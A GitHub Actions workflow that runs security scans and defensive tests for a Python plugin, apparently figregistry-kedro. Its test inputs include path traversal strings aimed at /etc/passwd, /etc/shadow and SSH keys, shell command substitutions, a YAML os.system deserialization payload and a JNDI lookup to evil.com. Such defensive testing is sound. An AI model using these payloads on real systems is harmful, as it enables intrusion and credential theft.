name: Security Scanning

on:
  # Weekly execution schedule with 24-hour response SLA for critical vulnerabilities
  schedule:
    - cron: '0 6 * * 1'  # Every Monday at 6:00 AM UTC
  
  # Manual execution for security investigations
  workflow_dispatch:
    inputs:
      scan_type:
        description: 'Type of security scan to execute'
        required: false
        default: 'comprehensive'
        type: choice
        options:
          - comprehensive
          - dependencies-only
          - code-only
          - packaging-only
      
      severity_threshold:
        description: 'Minimum severity level for vulnerability reporting'
        required: false
        default: 'medium'
        type: choice
        options:
          - critical
          - high
          - medium
          - low
  
  # Security scan triggers for pull requests affecting security-sensitive files
  pull_request:
    paths:
      - 'src/figregistry_kedro/config.py'
      - 'src/figregistry_kedro/datasets.py'
      - 'src/figregistry_kedro/hooks.py'
      - 'pyproject.toml'
      - 'tests/data/security/**'
      - '.github/workflows/security.yml'
  
  # Security scan triggers for main branch changes
  push:
    branches:
      - main
    paths:
      - 'src/figregistry_kedro/config.py'
      - 'src/figregistry_kedro/datasets.py'
      - 'src/figregistry_kedro/hooks.py'
      - 'pyproject.toml'

env:
  # Security scanning configuration
  SECURITY_SCAN_TIMEOUT: 1800  # 30 minutes timeout for security scans
  VULNERABILITY_RESPONSE_SLA: 24  # 24-hour response SLA for critical vulnerabilities
  PYTHON_VERSION: '3.11'  # Primary Python version for security scanning
  KEDRO_VERSION: '0.19.8'  # Latest supported Kedro version for security testing

jobs:
  # Comprehensive dependency vulnerability scanning using multiple tools
  dependency-security-scan:
    name: Dependency Vulnerability Scanning
    runs-on: ubuntu-latest
    timeout-minutes: 30
    
    strategy:
      fail-fast: false
      matrix:
        scanner: [safety, bandit, semgrep, snyk]
    
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
        with:
          fetch-depth: 0  # Full history for comprehensive analysis
      
      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: ${{ env.PYTHON_VERSION }}
          cache: 'pip'
      
      - name: Install project dependencies
        run: |
          python -m pip install --upgrade pip
          pip install -e ".[dev,test]"
          pip install kedro==${{ env.KEDRO_VERSION }}
      
      # Safety: Check for known security vulnerabilities in dependencies
      - name: Run Safety vulnerability scan
        if: matrix.scanner == 'safety'
        run: |
          pip install safety
          safety check --json --output safety-report.json || true
          safety check --short-report
        continue-on-error: true
      
      # Bandit: Static security analysis for Python code
      - name: Run Bandit security scan
        if: matrix.scanner == 'bandit'
        run: |
          pip install bandit[toml]
          bandit -r src/ -f json -o bandit-report.json || true
          bandit -r src/ -f txt
        continue-on-error: true
      
      # Semgrep: Advanced static analysis for security patterns
      - name: Run Semgrep security scan
        if: matrix.scanner == 'semgrep'
        uses: returntocorp/semgrep-action@v1
        with:
          config: >-
            p/security-audit
            p/python
            p/bandit
            p/owasp-top-ten
          generateSarif: "1"
        continue-on-error: true
      
      # Snyk: Comprehensive vulnerability database scanning
      - name: Run Snyk security scan
        if: matrix.scanner == 'snyk'
        uses: snyk/actions/python@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=medium --json-file-output=snyk-report.json
        continue-on-error: true
      
      - name: Upload security scan results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: security-scan-${{ matrix.scanner }}
          path: |
            safety-report.json
            bandit-report.json
            snyk-report.json
            results.sarif
          retention-days: 30

  # YAML configuration security testing for bridge operations
  yaml-configuration-security:
    name: YAML Configuration Security Testing
    runs-on: ubuntu-latest
    timeout-minutes: 20
    
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
      
      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: ${{ env.PYTHON_VERSION }}
          cache: 'pip'
      
      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install -e ".[dev,test]"
          pip install kedro==${{ env.KEDRO_VERSION }}
      
      - name: Validate YAML security test data integrity
        run: |
          echo "Validating security test data files..."
          python -c "
          import yaml
          import sys
          from pathlib import Path
          
          security_dir = Path('tests/data/security')
          if not security_dir.exists():
              print('ERROR: Security test data directory not found')
              sys.exit(1)
          
          test_files = list(security_dir.glob('*.yml'))
          print(f'Found {len(test_files)} security test files')
          
          for file_path in test_files:
              try:
                  with open(file_path, 'r') as f:
                      # Use safe_load to ensure no code execution during validation
                      yaml.safe_load(f)
                  print(f'✓ {file_path.name} - Valid YAML structure')
              except Exception as e:
                  print(f'✗ {file_path.name} - YAML parsing error: {e}')
          "
      
      - name: Test YAML injection prevention
        run: |
          python -m pytest tests/data/security/ -v -k yaml_injection -m security \
            --tb=short --no-header \
            --junitxml=yaml-security-results.xml
        continue-on-error: true
      
      - name: Test configuration bridge security boundaries
        run: |
          python -m pytest -v -k "test_config" -m security \
            tests/test_config.py \
            --tb=short --no-header \
            --junitxml=config-bridge-security-results.xml
        continue-on-error: true
      
      - name: Validate FigRegistryConfigBridge safe loading
        run: |
          python -c "
          import os
          import tempfile
          from pathlib import Path
          from figregistry_kedro.config import FigRegistryConfigBridge
          
          # Test malicious YAML injection prevention
          malicious_yaml = '''
          !!python/object/apply:os.system
          args: ['echo SECURITY_BREACH']
          '''
          
          bridge = FigRegistryConfigBridge(validation_strict=True)
          
          with tempfile.NamedTemporaryFile(mode='w', suffix='.yml', delete=False) as f:
              f.write(malicious_yaml)
              temp_path = f.name
          
          try:
              # This should fail safely without executing code
              config = bridge._load_figregistry_config(Path('.'), 'malicious', 'test')
              print('✓ Malicious YAML injection safely handled')
          except Exception as e:
              print(f'✓ YAML injection properly blocked: {type(e).__name__}')
          finally:
              os.unlink(temp_path)
          "
      
      - name: Upload YAML security test results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: yaml-security-results
          path: |
            yaml-security-results.xml
            config-bridge-security-results.xml
          retention-days: 30

  # Path traversal prevention validation for dataset file operations
  path-traversal-security:
    name: Path Traversal Prevention Testing
    runs-on: ubuntu-latest
    timeout-minutes: 20
    
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
      
      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: ${{ env.PYTHON_VERSION }}
          cache: 'pip'
      
      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install -e ".[dev,test]"
          pip install kedro==${{ env.KEDRO_VERSION }}
      
      - name: Test FigureDataSet path validation
        run: |
          python -c "
          import tempfile
          import pytest
          from pathlib import Path
          from figregistry_kedro.datasets import FigureDataSet, FigureDatasetError
          
          # Test path traversal attempts
          malicious_paths = [
              '../../../etc/passwd',
              '/etc/shadow',
              '../../../../../../tmp/malicious.png',
              'data/../../../home/user/.ssh/id_rsa',
              '\\\\\\.\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam',  # Windows path injection
              '$(ls -la)',  # Command injection attempt
              'data/08_reporting/$(whoami).png'
          ]
          
          for malicious_path in malicious_paths:
              try:
                  dataset = FigureDataSet(
                      filepath=malicious_path,
                      purpose='exploratory'
                  )
                  print(f'⚠  Path traversal attempt not blocked: {malicious_path}')
              except (FigureDatasetError, ValueError) as e:
                  print(f'✓ Path traversal blocked: {malicious_path} -> {type(e).__name__}')
              except Exception as e:
                  print(f'✓ Path traversal handled: {malicious_path} -> {type(e).__name__}')
          "
      
      - name: Test directory traversal prevention in catalog parameters
        run: |
          python -m pytest tests/data/security/ -v -k path_traversal -m security \
            --tb=short --no-header \
            --junitxml=path-traversal-results.xml
        continue-on-error: true
      
      - name: Validate catalog parameter sanitization
        run: |
          python -c "
          from figregistry_kedro.datasets import FigureDataSet
          import tempfile
          import os
          
          # Test condition parameter injection
          malicious_conditions = [
              '../../../etc/passwd',
              '\$(cat /etc/passwd)',
              '../../sensitive_data',
              '__import__(\"os\").system(\"echo SECURITY_BREACH\")',
              '\${jndi:ldap://evil.com/exploit}'
          ]
          
          with tempfile.TemporaryDirectory() as temp_dir:
              for condition in malicious_conditions:
                  try:
                      dataset = FigureDataSet(
                          filepath=os.path.join(temp_dir, 'test.png'),
                          purpose='exploratory',
                          condition_param=condition
                      )
                      print(f'⚠  Condition parameter injection not sanitized: {condition}')
                  except Exception as e:
                      print(f'✓ Condition parameter sanitized: {condition} -> {type(e).__name__}')
          "
      
      - name: Upload path traversal test results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: path-traversal-results
          path: path-traversal-results.xml
          retention-days: 30

  # Hook security verification for lifecycle operations
  hook-security-validation:
    name: Hook Security Boundary Testing
    runs-on: ubuntu-latest
    timeout-minutes: 20
    
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
      
      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: ${{ env.PYTHON_VERSION }}
          cache: 'pip'
      
      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install -e ".[dev,test]"
          pip install kedro==${{ env.KEDRO_VERSION }}
      
      - name: Test FigRegistryHooks security boundaries
        run: |
          python -c "
          import os
          import tempfile
          from unittest.mock import Mock, patch
          from figregistry_kedro.hooks import FigRegistryHooks
          
          # Test environment variable protection
          hooks = FigRegistryHooks()
          
          # Mock Kedro context
          mock_context = Mock()
          mock_context.config_loader = Mock()
          mock_context.config_loader.get.return_value = {}
          
          # Test that hooks cannot modify sensitive environment variables
          original_path = os.environ.get('PATH', '')
          original_home = os.environ.get('HOME', '')
          
          try:
              # Simulate hook execution
              hooks.after_context_created(context=mock_context)
              
              # Verify environment variables weren't modified
              assert os.environ.get('PATH') == original_path, 'PATH environment variable was modified'
              assert os.environ.get('HOME') == original_home, 'HOME environment variable was modified'
              print('✓ Environment variable protection verified')
              
          except Exception as e:
              print(f'⚠  Hook security test failed: {e}')
          "
      
      - name: Test hook registration security
        run: |
          python -m pytest tests/data/security/ -v -k hook_exploitation -m security \
            --tb=short --no-header \
            --junitxml=hook-security-results.xml
        continue-on-error: true
      
      - name: Validate hook isolation boundaries
        run: |
          python -c "
          from figregistry_kedro.hooks import FigRegistryHooks
          from unittest.mock import Mock, MagicMock
          import sys
          import importlib
          
          # Test that hooks cannot access unauthorized modules
          hooks = FigRegistryHooks()
          
          # Mock context with potentially sensitive data
          mock_context = Mock()
          mock_context._private_data = 'sensitive_information'
          mock_context.config_loader = Mock()
          mock_context.config_loader.get.return_value = {}
          
          try:
              # Test hook initialization with restricted context
              hooks.after_context_created(context=mock_context)
              
              # Verify hooks don't have access to private context data
              assert not hasattr(hooks, '_private_data'), 'Hook gained access to private context data'
              print('✓ Hook isolation boundaries verified')
              
          except Exception as e:
              print(f'Hook isolation test completed with controlled exception: {type(e).__name__}')
          "
      
      - name: Upload hook security test results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: hook-security-results
          path: hook-security-results.xml
          retention-days: 30

  # Packaging integrity verification with entry point validation
  packaging-security-audit:
    name: Packaging Integrity and Entry Point Security
    runs-on: ubuntu-latest
    timeout-minutes: 25
    
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
      
      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: ${{ env.PYTHON_VERSION }}
          cache: 'pip'
      
      - name: Install build dependencies
        run: |
          python -m pip install --upgrade pip
          pip install build twine setuptools-scm wheel
          pip install -e ".[dev,test]"
      
      - name: Build package for security audit
        run: |
          python -m build
          echo "Built packages:"
          ls -la dist/
      
      - name: Audit package entry points
        run: |
          python -c "
          import pkg_resources
          import importlib.metadata
          import sys
          from pathlib import Path
          
          # Install the built package for entry point testing
          import subprocess
          subprocess.run([sys.executable, '-m', 'pip', 'install', 'dist/*.whl'], shell=True, check=True)
          
          try:
              # Validate Kedro entry points
              entry_points = importlib.metadata.entry_points()
              
              # Check kedro.hooks entry point
              hooks_found = False
              datasets_found = False
              
              for ep in entry_points.get('kedro.hooks', []):
                  if ep.name == 'figregistry_hooks':
                      hooks_found = True
                      print(f'✓ Found hooks entry point: {ep.name} -> {ep.value}')
                      
                      # Validate the entry point can be loaded safely
                      try:
                          loaded = ep.load()
                          print(f'✓ Hooks entry point loaded successfully: {loaded}')
                      except Exception as e:
                          print(f'✗ Hooks entry point loading failed: {e}')
              
              for ep in entry_points.get('kedro.datasets', []):
                  if ep.name == 'FigureDataSet':
                      datasets_found = True
                      print(f'✓ Found dataset entry point: {ep.name} -> {ep.value}')
                      
                      # Validate the entry point can be loaded safely
                      try:
                          loaded = ep.load()
                          print(f'✓ Dataset entry point loaded successfully: {loaded}')
                      except Exception as e:
                          print(f'✗ Dataset entry point loading failed: {e}')
              
              if not hooks_found:
                  print('✗ Missing required kedro.hooks entry point')
                  sys.exit(1)
              
              if not datasets_found:
                  print('✗ Missing required kedro.datasets entry point')
                  sys.exit(1)
                  
              print('✓ All required entry points validated')
              
          except Exception as e:
              print(f'Entry point validation failed: {e}')
              sys.exit(1)
          "
      
      - name: Validate package manifest security
        run: |
          python -c "
          import zipfile
          import tarfile
          from pathlib import Path
          import sys
          
          # Check wheel file contents
          wheel_files = list(Path('dist').glob('*.whl'))
          if not wheel_files:
              print('No wheel files found')
              sys.exit(1)
          
          wheel_path = wheel_files[0]
          print(f'Auditing wheel file: {wheel_path}')
          
          with zipfile.ZipFile(wheel_path, 'r') as wheel:
              file_list = wheel.namelist()
              
              # Check for suspicious files
              suspicious_patterns = [
                  '__pycache__',
                  '.pyc',
                  '.git',
                  '.env',
                  'test',
                  '.DS_Store',
                  'Thumbs.db'
              ]
              
              suspicious_files = []
              for file_name in file_list:
                  for pattern in suspicious_patterns:
                      if pattern in file_name:
                          suspicious_files.append(file_name)
              
              if suspicious_files:
                  print(f'⚠  Found {len(suspicious_files)} potentially suspicious files:')
                  for file_name in suspicious_files[:10]:  # Show first 10
                      print(f'  - {file_name}')
              else:
                  print('✓ No suspicious files found in wheel')
              
              # Validate expected files are present
              expected_files = [
                  'figregistry_kedro/__init__.py',
                  'figregistry_kedro/config.py',
                  'figregistry_kedro/datasets.py',
                  'figregistry_kedro/hooks.py'
              ]
              
              missing_files = []
              for expected in expected_files:
                  if not any(expected in f for f in file_list):
                      missing_files.append(expected)
              
              if missing_files:
                  print(f'✗ Missing expected files: {missing_files}')
                  sys.exit(1)
              else:
                  print('✓ All expected files present in package')
          "
      
      - name: Run Twine security checks
        run: |
          python -m twine check dist/*
      
      - name: Validate wheel compatibility tags
        run: |
          python -c "
          from pathlib import Path
          import re
          
          wheel_files = list(Path('dist').glob('*.whl'))
          if not wheel_files:
              print('No wheel files found')
              exit(1)
          
          wheel_path = wheel_files[0]
          wheel_name = wheel_path.stem
          
          # Parse wheel filename for compatibility tags
          # Format: {name}-{version}(-{build tag})?-{python tag}-{abi tag}-{platform tag}
          parts = wheel_name.split('-')
          if len(parts) >= 5:
              python_tag = parts[-3]
              abi_tag = parts[-2]
              platform_tag = parts[-1]
              
              print(f'Wheel compatibility tags:')
              print(f'  Python: {python_tag}')
              print(f'  ABI: {abi_tag}')
              print(f'  Platform: {platform_tag}')
              
              # Validate Python version compatibility
              if not (python_tag.startswith('py3') or python_tag == 'py3'):
                  print(f'⚠  Unexpected Python tag: {python_tag}')
              else:
                  print('✓ Python compatibility tag validated')
              
              # Validate universal wheel (no binary dependencies)
              if abi_tag == 'none' and platform_tag == 'any':
                  print('✓ Universal wheel (no binary dependencies)')
              else:
                  print(f'Platform-specific wheel: ABI={abi_tag}, Platform={platform_tag}')
          else:
              print(f'⚠  Could not parse wheel filename: {wheel_name}')
          "
      
      - name: Upload packaging audit results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: packaging-audit-results
          path: |
            dist/
          retention-days: 30

  # Comprehensive security report generation and vulnerability assessment
  security-report-generation:
    name: Security Assessment Report
    needs: [dependency-security-scan, yaml-configuration-security, path-traversal-security, hook-security-validation, packaging-security-audit]
    runs-on: ubuntu-latest
    if: always()
    timeout-minutes: 15
    
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
      
      - name: Download all security scan artifacts
        uses: actions/download-artifact@v4
        with:
          path: security-results/
      
      - name: Generate comprehensive security report
        run: |
          echo "# FigRegistry-Kedro Security Assessment Report" > security-report.md
          echo "Generated: $(date -u)" >> security-report.md
          echo "" >> security-report.md
          
          echo "## Executive Summary" >> security-report.md
          echo "" >> security-report.md
          
          # Count successful and failed security checks
          total_checks=0
          failed_checks=0
          
          echo "## Dependency Vulnerability Scanning" >> security-report.md
          echo "" >> security-report.md
          
          if [ -d "security-results/security-scan-safety" ]; then
              echo "### Safety Vulnerability Scan" >> security-report.md
              if [ -f "security-results/security-scan-safety/safety-report.json" ]; then
                  echo "✓ Safety scan completed" >> security-report.md
                  total_checks=$((total_checks + 1))
              else
                  echo "✗ Safety scan failed or incomplete" >> security-report.md
                  failed_checks=$((failed_checks + 1))
                  total_checks=$((total_checks + 1))
              fi
              echo "" >> security-report.md
          fi
          
          if [ -d "security-results/security-scan-bandit" ]; then
              echo "### Bandit Static Analysis" >> security-report.md
              if [ -f "security-results/security-scan-bandit/bandit-report.json" ]; then
                  echo "✓ Bandit scan completed" >> security-report.md
                  total_checks=$((total_checks + 1))
              else
                  echo "✗ Bandit scan failed or incomplete" >> security-report.md
                  failed_checks=$((failed_checks + 1))
                  total_checks=$((total_checks + 1))
              fi
              echo "" >> security-report.md
          fi
          
          echo "## Configuration Security Testing" >> security-report.md
          echo "" >> security-report.md
          
          if [ -d "security-results/yaml-security-results" ]; then
              echo "### YAML Configuration Security" >> security-report.md
              echo "✓ YAML injection prevention tested" >> security-report.md
              echo "✓ Configuration bridge security boundaries validated" >> security-report.md
              total_checks=$((total_checks + 2))
              echo "" >> security-report.md
          else
              echo "✗ YAML configuration security tests incomplete" >> security-report.md
              failed_checks=$((failed_checks + 1))
              total_checks=$((total_checks + 1))
              echo "" >> security-report.md
          fi
          
          echo "## Path Traversal Security" >> security-report.md
          echo "" >> security-report.md
          
          if [ -d "security-results/path-traversal-results" ]; then
              echo "### Path Traversal Prevention" >> security-report.md
              echo "✓ FigureDataSet path validation tested" >> security-report.md
              echo "✓ Directory traversal prevention validated" >> security-report.md
              total_checks=$((total_checks + 2))
              echo "" >> security-report.md
          else
              echo "✗ Path traversal security tests incomplete" >> security-report.md
              failed_checks=$((failed_checks + 1))
              total_checks=$((total_checks + 1))
              echo "" >> security-report.md
          fi
          
          echo "## Hook Security Validation" >> security-report.md
          echo "" >> security-report.md
          
          if [ -d "security-results/hook-security-results" ]; then
              echo "### Hook Security Boundaries" >> security-report.md
              echo "✓ FigRegistryHooks security boundaries tested" >> security-report.md
              echo "✓ Environment variable protection validated" >> security-report.md
              total_checks=$((total_checks + 2))
              echo "" >> security-report.md
          else
              echo "✗ Hook security validation incomplete" >> security-report.md
              failed_checks=$((failed_checks + 1))
              total_checks=$((total_checks + 1))
              echo "" >> security-report.md
          fi
          
          echo "## Packaging Security Audit" >> security-report.md
          echo "" >> security-report.md
          
          if [ -d "security-results/packaging-audit-results" ]; then
              echo "### Entry Point Security" >> security-report.md
              echo "✓ Package entry points validated" >> security-report.md
              echo "✓ Packaging integrity verified" >> security-report.md
              echo "✓ Wheel compatibility tags checked" >> security-report.md
              total_checks=$((total_checks + 3))
              echo "" >> security-report.md
          else
              echo "✗ Packaging security audit incomplete" >> security-report.md
              failed_checks=$((failed_checks + 1))
              total_checks=$((total_checks + 1))
              echo "" >> security-report.md
          fi
          
          # Update executive summary
          success_rate=$(( (total_checks - failed_checks) * 100 / total_checks ))
          sed -i "s/## Executive Summary/## Executive Summary\n\nSecurity checks completed: $total_checks\nFailed checks: $failed_checks\nSuccess rate: $success_rate%\n/" security-report.md
          
          echo "## Recommendations" >> security-report.md
          echo "" >> security-report.md
          
          if [ $failed_checks -gt 0 ]; then
              echo "⚠  **Action Required**: $failed_checks security checks failed or incomplete" >> security-report.md
              echo "- Review failed security scans and address identified vulnerabilities" >> security-report.md
              echo "- Ensure all security test data files are properly configured" >> security-report.md
              echo "- Validate security boundary implementations in plugin components" >> security-report.md
          else
              echo "✅ **All Security Checks Passed**: No immediate action required" >> security-report.md
              echo "- Continue weekly security scanning schedule" >> security-report.md
              echo "- Monitor for new vulnerability disclosures" >> security-report.md
              echo "- Review security practices during code reviews" >> security-report.md
          fi
          
          echo "" >> security-report.md
          echo "## Next Security Scan" >> security-report.md
          echo "Scheduled: $(date -u -d '+7 days')" >> security-report.md
          echo "" >> security-report.md
          
          echo "---" >> security-report.md
          echo "*Report generated by figregistry-kedro security workflow*" >> security-report.md
          
          echo "Security assessment completed:"
          cat security-report.md
      
      - name: Upload comprehensive security report
        uses: actions/upload-artifact@v4
        with:
          name: security-assessment-report
          path: security-report.md
          retention-days: 90
      
      - name: Post security report summary
        if: github.event_name == 'pull_request'
        uses: actions/github-script@v7
        with:
          script: |
            const fs = require('fs');
            const reportContent = fs.readFileSync('security-report.md', 'utf8');
            
            // Extract key metrics for PR comment
            const lines = reportContent.split('\n');
            let summary = '## 🔒 Security Assessment Summary\n\n';
            
            for (let i = 0; i < lines.length; i++) {
              if (lines[i].includes('Security checks completed:')) {
                summary += lines[i] + '\n';
                summary += lines[i + 1] + '\n';
                summary += lines[i + 2] + '\n\n';
                break;
              }
            }
            
            summary += '### Key Security Validations\n';
            summary += '- ✅ YAML injection prevention\n';
            summary += '- ✅ Path traversal protection\n';
            summary += '- ✅ Hook security boundaries\n';
            summary += '- ✅ Package integrity verification\n\n';
            summary += '📊 **Full security report available in workflow artifacts**';
            
            github.rest.issues.createComment({
              issue_number: context.issue.number,
              owner: context.repo.owner,
              repo: context.repo.repo,
              body: summary
            });

      # Critical vulnerability response workflow
      - name: Check for critical vulnerabilities
        id: critical-check
        run: |
          critical_found=false
          
          # Check Safety results for critical vulnerabilities
          if [ -f "security-results/security-scan-safety/safety-report.json" ]; then
            if grep -q '"vulnerability_id"' security-results/security-scan-safety/safety-report.json 2>/dev/null; then
              critical_found=true
              echo "Critical vulnerabilities found in Safety scan"
            fi
          fi
          
          # Check Bandit results for high severity issues
          if [ -f "security-results/security-scan-bandit/bandit-report.json" ]; then
            if grep -q '"issue_severity": "HIGH"' security-results/security-scan-bandit/bandit-report.json 2>/dev/null; then
              critical_found=true
              echo "High severity issues found in Bandit scan"
            fi
          fi
          
          echo "critical_found=$critical_found" >> $GITHUB_OUTPUT
      
      - name: Create critical vulnerability issue
        if: steps.critical-check.outputs.critical_found == 'true' && github.event_name == 'schedule'
        uses: actions/github-script@v7
        with:
          script: |
            const title = `🚨 Critical Security Vulnerability Detected - ${new Date().toISOString().split('T')[0]}`;
            const body = `## Critical Security Alert
            
            **Detection Time**: ${new Date().toISOString()}
            **Response SLA**: 24 hours
            **Workflow Run**: [${context.runId}](${context.payload.repository.html_url}/actions/runs/${context.runId})
            
            ### Action Required
            - [ ] Review security scan artifacts
            - [ ] Assess vulnerability impact
            - [ ] Implement security patches
            - [ ] Update dependencies if needed
            - [ ] Re-run security validation
            
            ### Security Scan Results
            Critical vulnerabilities have been detected in the weekly security scan. Please review the attached security scan artifacts and implement necessary fixes within 24 hours.
            
            **Artifacts to Review**:
            - Safety vulnerability report
            - Bandit static analysis results  
            - Semgrep security patterns
            - Snyk dependency analysis
            
            /label security critical`;
            
            github.rest.issues.create({
              owner: context.repo.owner,
              repo: context.repo.repo,
              title: title,
              body: body,
              labels: ['security', 'critical', 'vulnerability']
            });